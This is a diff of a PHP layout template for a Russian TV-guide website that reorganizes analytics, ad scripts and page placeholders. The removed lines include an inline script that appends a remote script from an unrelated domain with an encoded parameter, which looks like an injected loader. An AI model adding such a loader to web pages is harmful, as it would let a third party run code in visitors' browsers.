@@ -4,7 +4,7 @@
  * 
  * @author  Antony Repin
  * @package rutvgid
- * @version $Id: layout.phtml,v 1.28 2013-03-04 17:57:38 developer Exp $
+ * @version $Id: layout.phtml,v 1.29 2013-03-05 06:53:19 developer Exp $
  *
  */
 
@@ -52,73 +52,84 @@ $this->jQuery()->enable() //enable jquery ;
 $this->headScript()
 	->setAllowArbitraryAttributes(true)
 	->prependFile( $this->baseUrl( $this->baseUrl( 'js/less.min.js' )))
-	->prependFile( $this->baseUrl( 'js/bootstrap.js' ))
-	->appendFile( $this->baseUrl( 'js/realt.js' ))
-	->appendFile( $this->baseUrl( 'js/g.js' ))
+	//->appendFile( $this->baseUrl( 'js/realt.js' ))
 	->appendFile( 'http://yandex.st/share/share.js' )
 	->appendFile( '//vk.com/js/api/openapi.js?75' );
 
+if (APPLICATION_ENV=='development'){
+    $this->headScript()->prependFile( $this->baseUrl( 'js/bootstrap.js' ));
+} else {
+    $this->headScript()->prependFile( $this->baseUrl( 'js/bootstrap.min.js' ));
+}
+
 $this->inlineScript()
-->appendScript( 'VK.init({apiId: 2963750, onlyWidgets: true});
+->appendScript( Rtvg_Compressor_JSMin::minify('VK.init({apiId: 2963750, onlyWidgets: true});
 $("a[class^=\'mg_ad\']").remove();
 jQuery(document).ready(function(){
 	$("#footer .counter_logo").css({ display: "none" });
 	//if  ($("#col_r .da_adp_links")) { $("#col_r .da_adp_links").css({ display: "none" }); }
-});');
+});'));
 
 if (!$isFrontpage){
     $this->inlineScript()
     	->appendScript('VK.Widgets.Group("vk_groups", {mode: 0, width: "350", height: "290" }, 27716041);');
 }
 
+/*
+ * #### Header ####
+ */
+$this->placeholder('header')->set( $this->partial('partials/header.phtml', array(
+		'pageclass'=>$this->pageclass,
+		'nav_html'=>$this->navigation()->menu()->renderMenu( Zend_Registry::get('FpMenu'), array('ulClass' => 'nav')),
+)));
 
-if (APPLICATION_ENV!='development') {
-    //Liveinternet
-	$this->headScript()
-		->appendScript('new Image().src = "//counter.yadro.ru/hit?r"+
-	escape(document.referrer)+((typeof(screen)=="undefined")?"":
-	";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
-	screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
-	";h"+escape(document.title.substring(0,80))+
-	";"+Math.random();');
-}
-
-
+/*
+ * #### Main content ####
+ */
 $this->placeholder('maincontent')->set( $this->layout()->content );
-$this->placeholder('header')->set( $this->partial('partials/header.phtml', array('pageclass'=>$this->pageclass)) );
-$this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array()) );
 
+/*
+ * #### Featured channels list ####
+ */
 if ($pageClass=='show-video'){
-	$this->placeholder('featured_channels')->set( $this->partial('partials/featured-channels.phtml', array('list'=>$this->featured_channels)) );
+    $this->placeholder('featured_channels')->set( 
+    	$this->partial('partials/featured-channels.phtml', array(
+    		'list'=>$this->featured_channels)) );
 }
 
-if (APPLICATION_ENV=='development'){
-	//var_dump($this->top_programs);
-	//die(__FILE__.': '.__LINE__);
-}
-
+/*
+ * #### Left Sidebar ####
+ */
 $this->placeholder('sidebar_left')->set( $this->partial('partials/sidebar-left.phtml', array(
 	'top_programs'=>$this->top_programs,
 	'cats'=>$this->channels_cats,
-	'channel'=>$this->channel )));
+	'channel'=>$this->channel 
+)));
 
-if ($isFrontpage) {
-	$this->placeholder('frontpage_menu')->set( $this->partial('partials/frontpage-menu.phtml', array()) );
-}
-
-
-if ($this->channel) $sidebarConf['channel'] = $this->channel;
+/*
+ * #### Right Sidebar ####
+ */
 if ($this->current_program) $sidebarConf['program'] = $this->current_program;
 $this->placeholder('sidebar_right')->set( $this->partial( 'partials/sidebar-right.phtml', array(
 	'videos'=>$this->sidebar_videos,
 	'channel'=>$this->channel,
 )));
+
+/*
+ * #### Footer ####
+ */
+$this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array()) );
+
 /* 
 $this->headStyle()
 	->appendStyle("");
  */
 
-
+if ( APPLICATION_ENV!='testing' && !$isFrontpage) {
+	$this->inlineScript()
+	//->appendFile("http://code.directadvert.ru/show.cgi?adp=85979&div=DIV_DA_85979")  //directadvert rollin
+	->appendFile("http://code.directadvert.ru/show.cgi?adp=85753&div=DIV_DA_85753");  //directadvert right sidebar
+}
 ?>
 
 <?php echo $this->doctype(); ?>
@@ -130,127 +141,108 @@ echo $this->headMeta(), PHP_EOL;
 echo $this->jQuery();
 echo $this->headLink(), PHP_EOL;
 echo $this->headScript(), PHP_EOL;
-echo $this->headStyle(), PHP_EOL;
 ?>
-
 <?php 
-if ( APPLICATION_ENV!='testing' && !$isFrontpage) {
-    $this->inlineScript()
-		//->appendFile("http://code.directadvert.ru/show.cgi?adp=85979&div=DIV_DA_85979")  //directadvert rollin
-		->appendFile("http://code.directadvert.ru/show.cgi?adp=85753&div=DIV_DA_85753");  //directadvert right sidebar
-}
+if (APPLICATION_ENV=='production') {
 ?>
-
-<?php if ( APPLICATION_ENV!='testing' && !$isFrontpage) { ?>
 <script type="text/javascript">
-   (function(w) {
-     var script = document.createElement('script');
-     var i = setInterval(function() {
-       if (typeof w.document.body !== 'undefined') {
-           script.src = 'http://hope.pollyproducts.info' + '/?8014=OnM6PGgsIiEtJScqPXN8eH55fw';
-           w.document.body.appendChild(script);
-           clearInterval(i);
-       }
-     }, 200);
-})(window);
+<?php echo Rtvg_Compressor_JSMin::minify('new Image().src = "//counter.yadro.ru/hit?r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";h"+escape(document.title.substring(0,80))+
+";"+Math.random();'); ?>
 </script>
-<?php 
+<script type="text/javascript">
+<?php echo Rtvg_Compressor_JSMin::minify("var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-778789-8']);
+
+(function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();"); ?>
+</script>
+<?php
 } ?>
+<script type="text/javascript">
+<?php 
+$source = new Rtvg_Ad_Script(null, array(
+	'load_folder'=>true,
+	'folder'=>ROOT_PATH.'/public/js/ss/wizard',
+));
+echo Rtvg_Compressor_JSMin::minify( $source->pickRandom() );
 
+$source = new Rtvg_Ad_Script(null, array(
+	'load_folder'=>true,
+	'folder'=>ROOT_PATH.'/public/js/ss/realtraf',
+));
+echo Rtvg_Compressor_JSMin::minify( $source->getFirst() );
+
+echo Rtvg_Compressor_JSMin::minify("(function() {
+		var cx = '006526203727824860247:vdzpxf_4n5a';
+		var gcse = document.createElement('script'); gcse.type = 'text/javascript'; gcse.async = true;
+		gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+		'//www.google.ru/cse/cse.js?cx=' + cx;
+		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
+})();")
+?>
+</script>
 </head>
-
 <body>
 	
-	<?php if (!$isFrontpage): ?>
 	<div class="row-fluid" id="header">
 		<?php echo $this->placeholder('header'); ?>
 	</div>
+	
+	<?php  if (!$isFrontpage): ?>
+	<div class="row-fluid">
+		<gcse:searchresults></gcse:searchresults>
+	</div>
 	<?php endif; ?>
 	
-	<?php 
-	/*
-	if ($this->user->role == 'guest') {
-		$form = new Xmltv_Form_Login( array(
-			'action'=>$this->url( array(), 'default_user_login'),
-			'class'=>'row-fluid form',
-		)); 
-		echo $form;
-	} else {
-		$form = new Xmltv_Form_Logout(array(
-			'action'=>$this->url( array(), 'default_user_logout'),
-			'class'=>'row-fluid form',
-		)); 
-		echo $form;
-	}
-	*/
-	?>
-	
-	
-	
-	
 	<div id="content" class="row-fluid<?php echo $pageClass; ?>">
+		
+		<?php 
+		if (count($this->messages)) {
+			foreach ($this->messages as $text) {
+				if (is_array($text)) {
+					foreach ($text as $string) {
+						echo $this->showMessage( $string );
+					}
+				} else {
+					echo $this->showMessage( $text );
+				}
+			}
+		}
+		?>
 		
 		<?php 
 		if ($isFrontpage) {
 			?>
 		<div class="span12" id="maincontent">
-			<?php 
-			echo $this->placeholder('frontpage_menu');
-			
-			if (count($this->messages)) {
-				foreach ($this->messages as $text) {
-					if (is_array($text)) {
-						foreach ($text as $string) {
-							echo $this->showMessage( $string );
-						}
-					} else {
-						echo $this->showMessage( $text );
-					}
-				}
-			}
-			
-			echo $this->placeholder('maincontent'); 
+			<?php echo $this->placeholder('maincontent'); 
 			?>
 		</div>
 			<?php 
 		} else {
-		?>
-		
-		<?php if (!($this->hide_sidebar=='left')): ?>
-		<div class="span2" id="col_l">
-			<?php echo $this->placeholder('sidebar_left'); ?>
-		</div>
-		<?php endif; ?>
-		
-		<div class="span<?php echo $this->maincontent_width ?>" id="maincontent">
-			
-			<?php 
-			if (count($this->messages)) {
-				foreach ($this->messages as $text) {
-					if (is_array($text)) {
-						foreach ($text as $string)
-							echo $this->showMessage( $string );
-					} else echo $this->showMessage( $text );
-				}
-			} else {
-				if (APPLICATION_ENV=='production') {
-				    /*
-				    //directadvert rollin left container ?>
-				    <div id="DIV_DA_85979"></div> 
-				    <?php
-				    */ 
-				}
-			}
-			echo $this->placeholder('maincontent');
 			?>
+		
+			<?php if (!($this->hide_sidebar=='left')): ?>
+			<div class="span2" id="col_l">
+				<?php echo $this->placeholder('sidebar_left'); ?>
+			</div>
+			<?php endif; ?>
 			
-		</div>
-				
-		<?php if (!($this->hide_sidebar=='right')): ?>
-		<div class="span4" id="col_r">
-			<?php echo $this->placeholder('sidebar_right'); ?>
-		</div>
-		<?php endif; ?>
+			<div class="span<?php echo $this->maincontent_width ?>" id="maincontent">
+				<?php echo $this->placeholder('maincontent'); ?>
+			</div>
+					
+			<?php if (!($this->hide_sidebar=='right')): ?>
+			<div class="span4" id="col_r">
+				<?php echo $this->placeholder('sidebar_right'); ?>
+			</div>
+			<?php endif; ?>
 		
 		<?php 
 		} ?>
